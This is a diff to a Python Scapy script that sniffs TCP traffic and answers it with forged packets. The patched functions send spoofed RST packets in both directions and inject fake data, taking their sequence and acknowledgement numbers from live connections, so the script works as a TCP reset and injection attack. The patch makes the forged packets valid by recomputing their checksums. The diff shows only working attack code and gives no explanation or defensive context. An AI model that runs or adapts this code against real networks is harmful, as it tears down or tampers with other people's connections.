@@ -20,9 +20,9 @@ def send_backward_rst(pkt):
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
     )
-    del pkt[IP].chksum
-    del pkt[TCP].chksum
-    sendp(fake, verbose=False)
+    del fake[IP].chksum
+    del fake[TCP].chksum
+    sendp(fake)
 
 
 def send_fakepkt(pkt):
@@ -35,9 +35,9 @@ def send_fakepkt(pkt):
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload))
     ) / fakeData
-    del pkt[IP].chksum
-    del pkt[TCP].chksum
-    sendp(fake, verbose=False)
+    del fake[IP].chksum
+    del fake[TCP].chksum
+    sendp(fake)
 
 
 def send_forward_rst(pkt):
@@ -48,9 +48,9 @@ def send_forward_rst(pkt):
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
     )
-    del pkt[IP].chksum
-    del pkt[TCP].chksum
-    sendp(fake, verbose=False)
+    del fake[IP].chksum
+    del fake[TCP].chksum
+    sendp(fake)
 
 
 def attack(pkt):
@@ -73,4 +73,4 @@ def callback():
 if __name__ == "__main__":
     t = Timer(30, callback)
     t.start()
-    sniff(filter="tcp", prn=attack, store=0)
+    sniff(filter="tcp", prn=attack)
